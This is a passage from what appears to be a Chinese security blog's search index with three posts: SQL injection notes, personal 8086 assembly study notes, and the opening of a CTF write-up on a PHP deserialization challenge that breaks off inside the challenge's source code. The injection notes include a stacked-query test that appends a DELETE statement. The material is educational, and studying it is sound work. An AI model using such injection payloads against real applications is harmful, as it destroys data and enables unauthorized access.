        <tag>Web Security</tag>
        <tag>SQL Injection</tag>
      </tags>
  </entry>
  <entry>
    <title>关于搜索型、字符型注入以及参数加密</title>
    <url>/2021/06/11/%E5%85%B3%E4%BA%8E%E6%90%9C%E7%B4%A2%E5%9E%8B%E3%80%81%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<h1 id="搜索型、字符型注入"><a href="#搜索型、字符型注入" class="headerlink" title="搜索型、字符型注入"></a>搜索型、字符型注入</h1><span id="more"></span>

<p>一般搜索栏都会进行模糊搜索</p>
<p>$search=GET[‘x’]</p>
<p>可能会用到Select * from table where name like ‘%$search%’</p>
<p>所以搜索型字符一般都有引号，需要考虑引号闭合</p>
<p>字符型注入一样也会有引号，有些数字型也会有引号</p>
<h1 id="参数加密"><a href="#参数加密" class="headerlink" title="参数加密"></a>参数加密</h1><p>一些注入点会用md5、base64等方式进行加密，所以我们也需要加密后再进行注入</p>
<h1 id="SQL删除更新查询"><a href="#SQL删除更新查询" class="headerlink" title="SQL删除更新查询"></a>SQL删除更新查询</h1><p>注入时根据语句来构造语句</p>
<p>查询：<code>select * from zhibo_test.m_sms where id=1;</code></p>
<p>插入:<code>insert into zhibo_test.m_sms values(&#39;66&#39;,&#39;register&#39;,&#39;13345677654&#39;,&#39;1234&#39;,&#39;0&#39;,&#39;11.11.1.1&#39;,&#39;15345333321&#39;);</code></p>
<p>更新:<code>update zhibo_test.m_sms set username=&#39;xiaodi&#39; where id=27;</code></p>
<p>删除: <code>delete from m_sms where id=28;</code></p>
<p>多条叠加（堆叠测试）:<code>select * from m_sms; delete from m_sms where id=66;</code></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>SQL Injection</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>SQL Injection</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编个人学习笔记</title>
    <url>/2021/09/06/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>汇编是很多课程的重要基础，正好最近在学习操作系统，发现在操作系统的学习中，汇编也表现得极为重要，同样在逆向的学习中，不会汇编基本等于与逆向无门了。</p>
<p>此篇是个人笔记，供自己复习和做笔记。</p>
<p>参考资料：<strong>《汇编语言(第3版) 》王爽著</strong></p>
<span id="more"></span>

<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="进制转换和数据宽度"><a href="#进制转换和数据宽度" class="headerlink" title="进制转换和数据宽度"></a>进制转换和数据宽度</h2><p><strong>16进制</strong>：</p>
<p>0123456789ABCDEF</p>
<p>10 11 12 13 14 15 16 17 18 19 20 21….</p>
<p><strong>One single hexadecimal digit = 4 bit</strong></p>
<p><strong>8进制</strong>：</p>
<p>01234567</p>
<p>10 11 12 13 14 15</p>
<p><strong>One single Octal digit = 3 bit</strong></p>
<p><strong>数据宽度：</strong></p>
<p>1 Byte = 8 Bit</p>
<p>1 Word = 2 Bytes =》四个十六进制数字为一个word</p>
<p>Double Word = 2 Word</p>
<p><strong>需要记住的一些数字</strong>：</p>
<p><code>1024=2^10</code></p>
<p>1KB=1024B(Byte)</p>
<p>1MB=1024KB</p>
<p>1GB=1024MB</p>
<p>1TB=1024GB</p>
<h2 id="CPU对存储器的读写"><a href="#CPU对存储器的读写" class="headerlink" title="CPU对存储器的读写"></a>CPU对存储器的读写</h2><p>比如CPU要从内存地址3中读写数据：</p>
<p><strong>读</strong></p>
<ul>
<li>CPU通过<strong>地址总线</strong>将地址信息3发出。</li>
<li>CPU通过<strong>控制总线</strong>发出<strong>读</strong>内存的命令，选中存储器的芯片，通知它我要读取数据。</li>
<li>存储器将地址3中的数据通过<strong>数据线</strong>送入CPU</li>
</ul>
<h2 id="地址总线"><a href="#地址总线" class="headerlink" title="地址总线"></a>地址总线</h2><p>地址总线是一根导线，我们知道一根导线传输数据的时候只有两种稳定状态 - 要么是<strong>高电平</strong>要么是<strong>低电平</strong> - 二进制表示就是<strong>0和1</strong>。</p>
<p>CPU用地址总线来寻址，有多少不同的信息，CPU就可以对多少个<strong>存储单元</strong>(一个存储单元里有1byte的信息)寻址</p>
<p>所以如果现一CPU有10根导线，那么它可以发出10 bit的二进制数，而10bit的二进制数可以表示2^10=1024个不同的数据，也就是可以寻找2^10=1024个<strong>内存单元</strong>。</p>
<p><img src="/image/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210906135049439.png" alt="image-20210906135049439"></p>
<p>上图演示的是将地址<strong>1011</strong>通过地址总线发出</p>
<h2 id="数据总线"><a href="#数据总线" class="headerlink" title="数据总线"></a>数据总线</h2><p><strong>CPU和其他器件之间的数据传送是通过数据总线进行的。数据总线的宽度决定了CPU和外界数据传送的速度。</strong></p>
<p>一个数据总线可以传送一个bit（位）的数据，<strong>8根数据总线可以传送一个byte的数据</strong></p>
<p>假设你有16根数据线，那么你一次性可以传输16bit的数据 - 所以你可以传输<strong>89D8</strong>H - 因为89D8是十六进制，一个十六进制数字为4bit，所以89D8刚好16bit. 如果数据线只有八根，意味着你只能传输8bit的数据，那么你只能分两次传送：先D8后89(从低位开始传)</p>
<p><img src="/image/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210906140434026.png" alt="image-20210906140434026"></p>
<h2 id="控制总线"><a href="#控制总线" class="headerlink" title="控制总线"></a>控制总线</h2><p>CPU对外部器件的控制是通过控制总线来进行的。此处控制总线是一个总称，它有多少根控制总线，意味着CPU提供了对外部器件的多少种控制。所以控制总线的宽度决定了CPU对外部器件的控制能力。</p>
<p>比如读和写就分别为两条控制总线。</p>
<h2 id="课后习题-1-1"><a href="#课后习题-1-1" class="headerlink" title="课后习题 1.1"></a>课后习题 1.1</h2><p><img src="/image/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210906140647234.png" alt="image-20210906140647234"></p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">(</span><span class="number">1</span><span class="punctuation">)</span> 该<span class="variable">CPU</span>的寻址能力为<span class="number">8</span><span class="variable">Kb</span>，换算成<span class="built_in">Byte</span>为<span class="number">8</span><span class="operator">*</span><span class="number">1024</span><span class="built_in">Byte</span>。 我们知道一个内存单元可以储存<span class="number">1</span>个<span class="built_in">Byte</span>，那么意味着该<span class="variable">CPU</span>可以寻址<span class="number">8</span><span class="operator">*</span><span class="number">1024</span><span class="operator">=</span><span class="number">2</span><span class="operator">^</span><span class="number">13</span>个内存单元。</span><br><span class="line"></span><br><span class="line">所以我们可以得出他有<span class="number">13</span>个地址总线，则宽度为<span class="number">13</span>。</span><br><span class="line"></span><br><span class="line"><span class="punctuation">(</span><span class="number">2</span><span class="punctuation">)</span> <span class="number">1</span><span class="variable">KB</span>的存储器有<span class="number">1024</span>个存储单元，因为一个存储单元存储<span class="number">1</span><span class="built_in">Byte</span>信息。存储单元的编号从<span class="number">0</span>到<span class="number">1023</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">(</span><span class="number">3</span><span class="punctuation">)</span> <span class="number">1</span><span class="variable">KB</span>的存储器可以存储<span class="number">10248</span><span class="operator">=</span><span class="number">2</span><span class="operator">^</span><span class="number">13</span> <span class="variable">bit</span><span class="operator">,</span> 和<span class="number">1024</span>个<span class="built_in">Byte</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">(</span><span class="number">4</span><span class="punctuation">)</span> <span class="number">1</span><span class="variable">GB</span><span class="operator">=</span><span class="number">2</span><span class="operator">^</span><span class="number">30</span> <span class="built_in">Byte</span><span class="operator">,</span> <span class="number">1</span><span class="variable">MB</span> <span class="operator">=</span> <span class="number">2</span><span class="operator">^</span><span class="number">20</span> <span class="built_in">Byte</span><span class="operator">,</span> <span class="number">1</span><span class="variable">KB</span><span class="operator">=</span> <span class="number">2</span><span class="operator">^</span><span class="number">10</span> <span class="built_in">Byte</span><span class="operator">.</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">(</span><span class="number">5</span><span class="punctuation">)</span> <span class="number">2</span><span class="operator">^</span><span class="number">16</span><span class="operator">*</span><span class="number">2</span><span class="operator">^</span><span class="punctuation">(</span><span class="operator">-</span><span class="number">10</span><span class="punctuation">)</span><span class="operator">=</span><span class="number">2</span><span class="operator">^</span><span class="number">6</span><span class="operator">,</span> <span class="number">2</span><span class="operator">^</span><span class="number">20</span><span class="operator">*</span><span class="number">2</span><span class="operator">^</span><span class="punctuation">(</span><span class="operator">-</span><span class="number">20</span><span class="punctuation">)</span><span class="operator">=</span><span class="number">1</span><span class="operator">,</span> <span class="number">2</span><span class="operator">^</span><span class="number">24</span><span class="operator">*</span><span class="number">2</span><span class="operator">^</span><span class="punctuation">(</span><span class="operator">-</span><span class="number">20</span><span class="punctuation">)</span><span class="operator">=</span><span class="number">2</span><span class="operator">^</span><span class="number">4</span><span class="operator">,</span><span class="number">2</span><span class="operator">^</span><span class="number">32</span><span class="operator">*</span><span class="number">2</span><span class="operator">^</span><span class="punctuation">(</span><span class="operator">-</span><span class="number">30</span><span class="punctuation">)</span><span class="operator">=</span><span class="number">2</span><span class="operator">^</span><span class="number">2</span><span class="operator">=</span><span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">(</span><span class="number">6</span><span class="punctuation">)</span> <span class="number">1</span><span class="variable">B</span><span class="operator">,</span><span class="number">1</span><span class="variable">B</span><span class="operator">,</span><span class="number">2</span><span class="variable">B</span><span class="operator">,</span><span class="number">2</span><span class="variable">B</span><span class="operator">,</span><span class="number">4</span><span class="variable">B</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">(</span><span class="number">7</span><span class="punctuation">)</span> </span><br><span class="line"></span><br><span class="line">要读的数据：<span class="number">1024</span><span class="operator">=</span><span class="number">2</span><span class="operator">^</span><span class="number">10</span> <span class="variable">byte</span><span class="operator">,</span> </span><br><span class="line"></span><br><span class="line">根据上面的问题，<span class="number">8086</span>一次可以读<span class="number">2</span> <span class="built_in">Byte</span>，那么要读<span class="number">2</span><span class="operator">^</span><span class="number">9</span><span class="operator">=</span><span class="number">512</span>次</span><br><span class="line"></span><br><span class="line"><span class="number">80386</span>一次可以读<span class="number">4</span> <span class="built_in">Byte</span><span class="operator">,</span>那么要读<span class="number">2</span><span class="operator">^</span><span class="number">8</span><span class="operator">=</span><span class="number">256</span>次</span><br><span class="line"></span><br><span class="line"><span class="punctuation">(</span><span class="number">8</span><span class="punctuation">)</span> 在存储器中，数据和程序以二进制形式存放</span><br></pre></td></tr></table></figure>

<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p>CPU由运算器、控制器、寄存器构成。</p>
<ul>
<li><strong>运算器</strong>进行<strong>信息处理</strong></li>
<li><strong>寄存器</strong>进行<strong>信息存储</strong></li>
<li><strong>控制器</strong>控制各种器件进行工作</li>
<li>内部总线连接各种器件，在它们之间进行数据的传送</li>
</ul>
<p><strong>16位寄存器：</strong></p>
<blockquote>
<p>AX</p>
<p>BX</p>
<p>CX</p>
<p>DX</p>
</blockquote>
<p><strong>8位寄存器：</strong>会被<strong>单独</strong>使用，比如AH溢出后，<strong>不会</strong>把溢出的位补到AX前面的高位（AH）去</p>
<blockquote>
<p>H表示high，L表示low</p>
<p>AH AL</p>
<p>BH BL</p>
<p>CH CL</p>
<p>DH DL</p>
</blockquote>
<h2 id="几条汇编指令"><a href="#几条汇编指令" class="headerlink" title="几条汇编指令"></a>几条汇编指令</h2><p>mov 寄存器，数据    <code>mov ax,2</code></p>
<p>mov 寄存器，寄存器    <code>mov ax,bx</code></p>
<p>mov 寄存器，内存单元    <code>mov ax,[0]</code></p>
<p>mov 内存单元，寄存器    <code>mov [0], ax</code></p>
<p>mov 段寄存器，寄存器    <code>mov ds,ax</code></p>
<p>mov 寄存器，段寄存器    <code>mov ax,ds</code></p>
<h2 id="课后习题2-1"><a href="#课后习题2-1" class="headerlink" title="课后习题2.1"></a>课后习题2.1</h2><p>（1）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,62627	AX=F4A3H</span><br><span class="line">mov ah,31H		AX=31A3H</span><br><span class="line">mov al,23H		AX=3123H</span><br><span class="line">add ax,ax		AX=6246H</span><br><span class="line">mov bx,826CH	BX=826CH</span><br><span class="line">mov cx,ax		CX=6246H</span><br><span class="line">mov ax,bx		AX=826CH</span><br><span class="line">add ax,bx		AX=04D8H</span><br><span class="line">mov al,bh		AX=0482H</span><br><span class="line">mov ah,bl		AX=6C82H</span><br><span class="line">add ah,ah		AX=D882H</span><br><span class="line">add al,6		AX=D888H</span><br><span class="line">add al,al		AX=D810H</span><br><span class="line">mov ax,cx		AX=6246H</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>（2）用目前学过的汇编指令，最多使用四条指令，计算2的4次方</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,0002</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br><span class="line">add ax,ax</span><br></pre></td></tr></table></figure>

<h2 id="物理地址、段和偏移地址"><a href="#物理地址、段和偏移地址" class="headerlink" title="物理地址、段和偏移地址"></a>物理地址、段和偏移地址</h2><p><strong>8086中，地址总线有20根，但是数据总线只有16根。所以需要用两个16进制表示20进制的地址。段地址（16位）×16＋偏移地址（16位）=地址（20位）</strong></p>
<p>地址加法器处理后可以得到物理地址</p>
<p><code>物理地址=段地址*16+偏移地址</code></p>
<blockquote>
<p><code>短地址*16</code>表示十六进制左移1位，也就是二进制左移4位</p>
<p>比如十进制20要左移一位：20*10=200</p>
<p>二进制10B左移一位：100B转换成十进制2*2=4</p>
<p>一个数据的二进制形式左移1位，相当于该数据×2</p>
<p>一个数据的二进制形式左移N位，相当于该数据×2^N</p>
</blockquote>
<p><img src="/image/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210907170044257.png" alt="image-20210907170044257"></p>
<p>偏移地址16位，最多可以寻址64KB(2^16bit个内存单元，一个内存单元8bit，所以2^16*2^3=2^19bit=2^6KB=64KB)</p>
<h2 id="课后习题2-2"><a href="#课后习题2-2" class="headerlink" title="课后习题2.2"></a>课后习题2.2</h2><figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">（<span class="number">1</span>）给定段地址位<span class="number">0001</span><span class="variable">H</span>，仅通过变化偏移地址寻址，<span class="variable">CPU</span>的寻址范围为？</span><br><span class="line"></span><br><span class="line">最小：<span class="number">0001</span><span class="variable">H</span><span class="operator">*</span><span class="number">16</span><span class="operator">+</span><span class="number">0000</span><span class="variable">H</span><span class="operator">=</span><span class="number">0010</span><span class="variable">H</span></span><br><span class="line"></span><br><span class="line">最大：<span class="number">0001</span><span class="variable">H</span><span class="operator">*</span><span class="number">16</span><span class="operator">+</span><span class="variable">FFFFH</span><span class="operator">=</span><span class="number">1</span> <span class="number">000</span><span class="variable">FH</span></span><br><span class="line"></span><br><span class="line"><span class="operator">**</span>所以寻址范围为<span class="number">0001</span><span class="variable">H</span><span class="operator">~</span><span class="number">1000</span><span class="variable">FH</span><span class="operator">**</span></span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）有一段数据存放在内存 <span class="number">20000</span><span class="variable">H</span>单元中，先给定段地址为<span class="variable">SA</span>，想用偏移地址寻到此单元，则<span class="variable">SA</span>应该满足的条件是：</span><br><span class="line"></span><br><span class="line">最小为<span class="operator">:</span></span><br><span class="line"></span><br><span class="line">当偏移地址为最大<span class="variable">FFFFH</span>时，<span class="number">20000</span><span class="variable">H</span><span class="operator">-</span><span class="variable">FFFFH</span><span class="operator">=</span><span class="number">1</span> <span class="number">0001</span><span class="variable">H</span></span><br><span class="line"></span><br><span class="line"><span class="variable">SA</span>必须为<span class="number">16</span>的倍数<span class="operator">,</span>所以<span class="variable">SA</span>左移后的最后一位必须是<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="number">0010</span><span class="variable">H</span><span class="operator">-</span>》<span class="number">1001</span><span class="variable">H</span></span><br><span class="line"></span><br><span class="line"><span class="operator">**</span>所以最小为<span class="number">1001</span><span class="variable">H</span><span class="operator">**</span></span><br><span class="line"></span><br><span class="line">最大为<span class="operator">:</span></span><br><span class="line"></span><br><span class="line"><span class="number">20000</span><span class="variable">H</span><span class="operator">-&gt;</span><span class="number">2000</span><span class="variable">H</span></span><br><span class="line"></span><br><span class="line"><span class="operator">**</span>所以最大为<span class="number">2000</span><span class="variable">H</span><span class="operator">**</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><p>8086CPU有四个段寄存器：</p>
<p><strong>CS（code segment）, DS(data segment), SS(stack segment), ES(extra segment)</strong></p>
<p>CS和IP（instructor pointer指令指针寄存器）是最关键寄存器 -》指向了CPU当前要读的地址</p>
<p>8086CPU工作过程：</p>
<ul>
<li>从CS:IP指向的内存单元获取指令</li>
<li>IP=IP+所读取指令的长度，从而指向下一条按指令</li>
<li>执行指令，回到第一步，重复这个过程</li>
</ul>
<p>修改CS IP的指令不用<code>mov</code>指令（因为不支持把数据直接送入段寄存器）而是用<code>jmp</code></p>
<ul>
<li>同时修改CS 和 IP：<ul>
<li>jmp CS: IP</li>
<li>如 jmp 2AE3:3<ul>
<li>CS=2AE3H, IP=0003H -&gt; 2AE30+0003=2AE33H</li>
</ul>
</li>
<li>jmp 3:0B16<ul>
<li>CS=0003H, IP =0B16H -&gt; 0030+0B16=0B46H</li>
</ul>
</li>
</ul>
</li>
<li>只修改IP，当前CS不变<ul>
<li>jmp IP</li>
</ul>
</li>
</ul>
<h2 id="课后习题-2-3"><a href="#课后习题-2-3" class="headerlink" title="课后习题 2.3"></a>课后习题 2.3</h2><p>下列3条指令执行后，CPU几次修改IP？都是在什么时候？最后IP中的值是多少？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,bx#读取指令后IP被修改</span><br><span class="line"></span><br><span class="line">sub ax,ax#读取指令后IP被修改</span><br><span class="line"></span><br><span class="line">jmp ax #读取指令后IP被修改，然后IP又被修改为ax</span><br><span class="line"></span><br><span class="line"># cpu修改了4次IP，因为每执行完一个指令，IP都会递增1， -》 在jmp ax处，最后IP被修改为了0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210909145406877.png" alt="image-20210909145406877"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount c: d:\asm</span><br><span class="line">c:\</span><br><span class="line">debug</span><br></pre></td></tr></table></figure>

<h1 id="寄存器（内存访问）"><a href="#寄存器（内存访问）" class="headerlink" title="寄存器（内存访问）"></a>寄存器（内存访问）</h1><h2 id="内存中字的存储"><a href="#内存中字的存储" class="headerlink" title="内存中字的存储"></a>内存中字的存储</h2><p>一个内存单元是一个byte（字节）</p>
<p>一个字单元由两个内存单元组成，也就是两个字节（bytes）=1个word</p>
<p>0地址: 2E</p>
<p>1地址：3C</p>
<p>问0地址单元存储的**字型(word)**数据是：3C2EH</p>
<p>0地址单元存储的**字节型(byte)**数据是：2EH</p>
<h2 id="DS和-address"><a href="#DS和-address" class="headerlink" title="DS和[address]"></a>DS和[address]</h2><p>要给ds寄存器赋值，必须要先把值赋给通用寄存器，然后通用寄存器再赋值给ds寄存器。数据不能直接送进段寄存器。</p>
<p><code>[]</code>是对数据段操作</p>
<p><strong>例如：从10000H中读取数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov bx,1000H#为什么是1000H，因为1000H段地址*16=左移一位，然后加上偏移地址就可以得到最后的真实地址</span><br><span class="line">mov ds, bx</span><br><span class="line">mov al,[0]#10000+0=10000H</span><br></pre></td></tr></table></figure>

<h2 id="字的传送"><a href="#字的传送" class="headerlink" title="字的传送"></a>字的传送</h2><p><img src="/image/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210909155520090.png" alt="image-20210909155520090"></p>
<p>ax是一个<strong>word的长度</strong>，所以这里mov ax,[0]其实取的是1123而不是23</p>
<p>11是高位，22是低位，我们取了连续的<strong>两个内存单元而不是一个内存单元</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub ax,1CH#ax=ax-1CH</span><br></pre></td></tr></table></figure>

<h2 id="mov-add-sub指令"><a href="#mov-add-sub指令" class="headerlink" title="mov, add, sub指令"></a>mov, add, sub指令</h2><p>mov ds, ax和mov ax,ds都可以实现。</p>
<p>段寄存器也可以给通用寄存器传数据</p>
<h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><p>我们用123B0H~123B9H这段空间来存放数据：</p>
<ul>
<li>段地址：123BH</li>
<li>长度：10字节（一个地址指向一个内存单元，一个内存单元等于一个字节，0~9有10个内存单元，所以有10个字节）</li>
</ul>
<p>高位字节存放在高位内存</p>
<p>低位字节存在低位内存</p>
<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>由高地址向低地址增长</p>
<blockquote>
<p>CS:IP指向指令</p>
<p>DS:IP指向数据</p>
<p>SS栈段寄存器(Stack segment) - 存放栈顶的段地址</p>
<p>SP寄存器(Stack pointer) - 存放栈顶的偏移地址</p>
<p>SS:SP指向栈顶元素，但如果stack为空的时候，会指向最高地址单元的下一个单元，比如栈空间是10000H~1000FH，如果stack为空，会指向1000:10（所以不存在栈顶元素）</p>
<ul>
<li>也可以说是最后一个元素被pop, SP=E(最后一个元素所在栈地址)+2=10</li>
</ul>
</blockquote>
<p>push ax</p>
<ul>
<li><p>先SP = SP-2(因为ax是2个bytes = word，所以是<strong>2</strong>个内存空间)</p>
</li>
<li><p>把ax放进SS:SP指向的位置</p>
</li>
</ul>
<p>pop ax</p>
<ul>
<li><p>先把SS:SP指向位置的内容pop并赋值给ax</p>
</li>
<li><p>SP = SP+2</p>
</li>
</ul>
<p>pop的时候其实没有删除数据，只是指针改变了（所以被pop的数据就不在栈里了，因为它的地址不在栈顶），下次push的时候原本的东西就被覆盖了。</p>
<p>C语言里面的函数其实就是用到了栈，函数会把局部变量什么的都放在stack里，当函数返回后，stack就没有了。</p>
<h2 id="栈顶越界的问题"><a href="#栈顶越界的问题" class="headerlink" title="栈顶越界的问题"></a>栈顶越界的问题</h2><p>8086CPU只知道：</p>
<ul>
<li>当前栈顶在何处</li>
<li>当前要执行的指令是哪一条</li>
</ul>
<p>要防止push和pop导致栈顶超界，根据可能用到的最大栈空间，来安排栈的大小 - 防止push的数据太多而导致超界、栈空的时候继续pop导致超界。</p>
<h2 id="push、pop指令"><a href="#push、pop指令" class="headerlink" title="push、pop指令"></a>push、pop指令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 寄存器</span><br><span class="line">push 段寄存器</span><br><span class="line">push 内存单元#push [0] -&gt; ds:ip</span><br><span class="line">pop 寄存器</span><br><span class="line">pop 段寄存器</span><br></pre></td></tr></table></figure>

<p><img src="/image/%E6%B1%87%E7%BC%96%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20211202103533130.png" alt="image-20211202103533130"></p>
<p>上图演示了将2266H放入10000H的位置。因为push会先减去sp，所以我们要先把sp+2</p>
<h2 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h2><p><strong>再次强调：</strong></p>
<p>SS:SP指向栈顶元素，但如果stack为空的时候，会指向最高地址单元的下一个单元，比如栈空间是10000H~1000FH，如果stack为空，会指向1000:10（所以不存在栈顶元素）</p>
<ul>
<li>也可以说是最后一个元素被pop, SP=E(最后一个元素所在栈地址)+2=10</li>
</ul>
<h1 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h1><p>伪指令是让编译器去处理</p>
<p>汇编指令是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:codesg #假设代码代码段叫做codesg</span><br><span class="line"></span><br><span class="line">codesg segement</span><br><span class="line"></span><br><span class="line">start:	mov ax,0123H</span><br><span class="line">		mov bx,056H</span><br><span class="line">		add ax,bx</span><br><span class="line">		add ax,ax</span><br><span class="line">	</span><br><span class="line">	mov ax,4c00H</span><br><span class="line">	int 21H</span><br><span class="line">codesg ends #段的结束</span><br><span class="line"></span><br><span class="line">end start#结束 这里的start可以随便什么名字，程序只会查找end后面的东西</span><br></pre></td></tr></table></figure>

<p><strong>程序返回：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br></pre></td></tr></table></figure>

<p>CMD将程序载入内存，将CPU的CS:IP指向程序，程序运行结束后回到command，CPU继续运行command</p>
]]></content>
      <categories>
        <category>Reverse Engineering</category>
      </categories>
      <tags>
        <tag>Reverse Engineering</tag>
        <tag>Assembly Fundamentals</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯2020青龙组AreUSerialz php反序列化漏洞 Write-up</title>
    <url>/2021/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Write-up/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个漏洞不难，但是在绕过方面的小<strong>Tip</strong>很值得学习，所以写这篇文章来记录一下。<a href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz">靶场地址</a></p>
<span id="more"></span>

<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>先看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;<span class="comment">//如果op=1，写出文件</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;<span class="comment">//如果op=2,读入文件</span></span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);<span class="comment">//否则提示错误</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span 